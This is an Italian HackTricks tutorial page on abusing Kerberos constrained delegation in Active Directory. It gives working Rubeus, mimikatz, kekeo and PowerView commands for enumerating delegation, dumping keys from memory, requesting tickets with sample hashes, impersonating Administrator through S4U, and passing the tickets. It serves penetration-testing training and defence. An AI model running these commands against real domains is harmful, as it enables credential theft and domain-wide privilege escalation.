# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Utilizzando questo, un amministratore di dominio può **consentire** a un computer di **impersonare un utente o un computer** contro un **servizio** di una macchina.

- **Servizio per Utente a se stesso (**_**S4U2self**_**):** Se un **account di servizio** ha un valore _userAccountControl_ che contiene [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), allora può ottenere un TGS per se stesso (il servizio) per conto di qualsiasi altro utente.
- **Servizio per Utente a Proxy(**_**S4U2proxy**_**):** Un **account di servizio** potrebbe ottenere un TGS per conto di qualsiasi utente per il servizio impostato in **msDS-AllowedToDelegateTo.** Per farlo, ha prima bisogno di un TGS da quell'utente a se stesso, ma può utilizzare S4U2self per ottenere quel TGS prima di richiedere l'altro.

**Nota**: Se un utente è contrassegnato come ‘_L'account è sensibile e non può essere delegato_’ in AD, non sarai **in grado di impersonarlo**.

Questo significa che se **comprometti l'hash del servizio** puoi **impersonare utenti** e ottenere **accesso** a loro nome al **servizio configurato** (possibile **privesc**).

Inoltre, **non avrai solo accesso al servizio che l'utente è in grado di impersonare, ma anche a qualsiasi servizio** perché lo SPN (il nome del servizio richiesto) non viene controllato, solo i privilegi. Pertanto, se hai accesso al **servizio CIFS** puoi anche avere accesso al **servizio HOST** utilizzando il flag `/altservice` in Rubeus.

Inoltre, **l'accesso al servizio LDAP su DC** è ciò che è necessario per sfruttare un **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Ci sono **altri modi per ottenere un biglietto TGT** o il **RC4** o **AES256** senza essere SYSTEM nel computer, come il Printer Bug e la delega non vincolata, il relaying NTLM e l'abuso del servizio di certificazione Active Directory.
>
> **Basta avere quel biglietto TGT (o hashato) per poter eseguire questo attacco senza compromettere l'intero computer.**
```bash:Using Rubeus
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Ulteriori informazioni su ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{{#include ../../banners/hacktricks-training.md}}
